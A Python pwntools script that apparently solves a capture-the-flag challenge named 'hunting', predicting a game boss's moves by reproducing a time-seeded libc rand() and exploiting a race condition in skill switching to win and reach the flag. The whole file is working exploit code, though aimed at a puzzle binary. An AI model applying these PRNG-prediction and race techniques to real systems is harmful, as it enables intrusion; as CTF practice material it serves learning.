#!/usr/bin/python
from pwnlib.tubes import process
import sys, time, re
from ctypes import *

cdll.LoadLibrary("libc.so.6")
libc = CDLL("libc.so.6")

playerLevel = 1
playerHP = 500
bossHP = 100
counter = 0

# Change curently used skill
def changeskill(skill):
	r.sendline('3')
	r.sendline(str(skill))
	r.recvuntil("Exit\n")

# Get the matching shield countering the boss attack
def getShieldToUse(attack):
	if attack == 1:
		return 3
	elif attack == 2:
		return 2
	else:
		return 1

# just a helper to match current states
def findValue(pattern, msg, defValue):
	match = re.search(pattern, msg, re.S)

	if match:
		return int(match.group(1))

	return defValue

# check for state changes in server responses
def checkForStates(msg):
	global playerLevel, bossHP, playerHP

	playerLevel = findValue("level:(.?)\n", msg, playerLevel)
	bossHP = findValue("Boss's hp is (.+?)\n", msg, bossHP)
	playerHP = findValue("Your HP is (.+?)\n", msg, playerHP)

def useskill():
	global counter, playerLevel, playerHP, bossHP

	print ("")
	print ("Start attack round")
	print ("")
	print (" [+] Current level : %d" % playerLevel)
	print (" [+] Player HP     : %d" % playerHP)
	print (" [+] Boss HP       : %d" % bossHP)
	print ("")

	if playerLevel == 4:
		# On level4 we can use icesword which results in -1 dmg
		r.recv(timeout=1)

		# Try to guess the boss attack, but this doesn't work reliable anymore, since 
		# fireball also adds another sleep, so we just have to hope ;-)
		bossAttack = libc.rand() & 3
		libc.rand() & 3
		libc.rand() & 3
		libc.rand() & 3

		useShield = getShieldToUse(bossAttack)

		# This will switch to fireball, attack and immediately switch to ice sword
		# (while the attack thread is running and already passed the skill check) 
		time.sleep(1)
		r.send("3\n2\n2\n%s\n" % str(useShield))
		time.sleep(0.1)
		r.send("3\n7\n2\n1\n")

		checkForStates(r.recv())

		time.sleep(10)

		counter += 1

		if counter==2:
			# Hopefully we killed the boss here, executing cat /home/hunting/flag
			r.interactive()

		return

	# Send "Use skill"
	r.sendline('2')

	bossAttack = libc.rand() & 3	# rand for boss attack in defend function
	libc.rand()			# consume rand for player attack in attack thread

	time.sleep(0.1)

	useShield = getShieldToUse(bossAttack)

	# Send the shield we want to use to the server
	r.sendline(str(useShield))

	# Receive responses and update player states
	checkForStates(r.recv(timeout=1))
	checkForStates(r.recvuntil("Exit\n", timeout=1))

def exploit(r):
	r.recvuntil("Exit\n", timeout=0.2)

	# Select iceball 
	changeskill(3)

	while 1:
		useskill()

r = process.process("./hunting")

# Initialize the seed value
libc.srand(libc.time(None))
libc.rand()

exploit(r)
